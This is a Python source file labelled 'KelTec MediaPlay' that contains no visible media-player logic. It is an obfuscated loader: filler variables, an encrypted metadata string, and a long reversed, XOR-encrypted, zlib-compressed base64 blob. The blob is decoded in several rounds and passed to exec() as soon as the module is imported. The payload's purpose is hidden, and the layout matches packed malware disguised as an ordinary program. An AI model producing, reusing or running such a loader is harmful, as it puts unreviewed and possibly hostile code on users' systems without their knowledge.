# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 961691 ^ 649452
_lx1_1 = len("266d54")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-741422)
_lx3_3 = 375396 * 0
_lx4_4 = 992565 ^ 273565
_K = '083b8c88f683c44d6f03cf5af5065e7b84df8b606423f87819d27ae36e5e3842'
_M = 'odHtYI+SEZCDHuDUHdpoiTJawow97bafHdbeL+2Y9NDm3Lgi299TxY8TvIQZjmzeM1CUij7j7swV1oh8vM6j3emH5CXejVSX3Bm5'
_D = '==gMXTQ+WVDXJMxK+8DOvZ6llTIMuddJ5R5DDjFI2OrKdKSS3oBhtrc6xn1K90Uaa2s8DaO4ATQfviQ4KXSYHb7FPIBJt8iwZnE2sMSELOhS49Yocp9wx14Ff4mpWtHU59QqzbWlg3fiSePDL1jlq4MRt2dm7sNb1MXz/d5O+/jKQZSuGBO8JuvMZiMKCtDTSHrpuaD4CPWUuh9f1QFkpAjCOh9KcIUA/nf733Qq/lBbUn/bOUkZhkewgnMwfdFCjzhR6uuQ2XFIE/0gy2VXSmy9/aOta0vkh+cBJKIqkIJzf+91AvgwSXwt+p+rAHzAUrnQaZnJ3IlrQc0V0NncYWWGJ9e+kPEs26tURpVMaWC1zDpGp3HuDtys4xDKaANOq8jdFL45y9mh5qiVRLLkpPH7Jh5/bS5FC0ddo5xQvOsecsBhfE0sOmEsIUu9x5rf7xuT0vy5qEcl8ubNjeApb71kRPU9b0sQJZv53kZwxqm+G+1ipvoYOi9O0rkMp6aSFvo6ftf7ngSZKZvjZFq0Qu4cCw8o4fK627p2v5R9B2gK8I7gV7teUbTTPfD2hgZUGAYVB2UlNxnR6a5J/AEymlkupO/yTzNe0ThsQCrwI2UwMITWI/7kF6vVGyjkTO5+GsawbdZMZcVaGp70U8n0B2NJkJKLfzEg3imwhmczjquQL6KYlrLxm0EvC5RAm9ntGOPCP/v+ll0aWpEZHAz8uk66y1CRO4RSaMxZEgKWXVY/OFxSq7Xuhjm0tSP3k/WIbGgn0q3g5LMxHUxAt7dhNwKjOatDVJaMSqxy3LDQiQ8TQiicXURqNRpULp31DSVE1Bn9cSUWINJJ0fQVGJUSO4t++zjwpqW9fKt8Egy11AFD/55t/3AwdzvgsEEqYXkt8wn30oVBNe6iDkfCywqWMgA3CDd4gdantTMBsl8yeufhZTnWbjcPpHfusBpeFXDRmfqDbDRaYem0PxmT6IFlssQpy78g4zJia8/wdU8etC9beGm4FBNseQST4HCkVLX6tll1308VmQZj7ojeu7famf/z+SSwdBVh8nk5hwsxIbqXUXvc9Y0J+Lbik+kzEC8ET9z3+pMPmaIRSNDFKXi1MyCJrPMOUKAVWQIZHp7bxS5vsdkbspVuTiGwT5sQWAQLVVIRYIwxKU1nwq2BHzzz1Ouk7U51ENe194yuV534+99xTiURir9fbcYgjC3NCe6f5+zN+DHDut9LkfyuSzt5mRmOTFFLjT4FljFWP0dFa8X/Nt5PisYb4kGqISvA+mnAtG2quMRWFtxRfwrzxnNPGgwxMtq5eD7T4kT9y9s5au92Ulat/LdNKaYAty6z5CBfTsnsLj7pbftV0RttcphaSJYSQt3CeFEtL7AOp7n/knC22MookXHlwGX1XQ687hupsONqxkWfUwn0Zk//7odOQvXfuRCnjf0sWnM/vYM3z7jWVCBG/uYAR4Lt43tZxSwrrVgVkQs7NxioY9BlDhoS0rzcaN09NmJTFt4PIF1QU1obIu5fFC6RXxa9zqSzqgHJuXd7Kui+SF0m0ifi2Nnd7iYAP8WVf3LI6EU2KVed0AFzer/RIIysTkotK4tOspE1E7BOVvCvP6tKcbhX9DlhB2rJEAtyrlXRrvf0k/F4'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})